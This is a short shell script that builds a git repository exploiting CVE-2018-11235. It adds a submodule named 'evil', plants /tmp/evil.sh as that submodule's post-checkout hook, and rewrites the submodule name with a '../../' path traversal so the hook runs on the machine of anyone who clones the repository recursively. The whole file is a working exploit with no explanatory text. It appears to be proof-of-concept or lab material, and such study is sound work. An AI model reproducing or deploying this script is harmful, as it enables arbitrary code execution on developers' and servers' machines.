#!/bin/sh

set -e
reponame=$1
base_host=$2

base_dir="/var/www/html/repos"
repo_dir="$base_dir/${reponame}"
repo_submodule="http://${base_host}/git/base.git"

cd $base_dir

git init "$repo_dir"
cd "$repo_dir"
git config user.email "your@example.com"
git config user.name "YourName"
git submodule add "$repo_submodule" evil
mkdir modules
cp -r .git/modules/evil modules

chmod +x /tmp/evil.sh
cp /tmp/evil.sh modules/evil/hooks/post-checkout
git config -f .gitmodules submodule.evil.update checkout
git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil
git add modules
git submodule add "$repo_submodule"
git add base
git commit -am CVE-2018-11235
exit 0